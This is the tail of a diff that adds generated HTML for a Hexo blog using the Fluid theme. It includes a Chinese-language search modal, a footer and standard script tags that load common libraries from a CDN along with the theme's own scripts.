+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script defer src="/js/leancloud.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
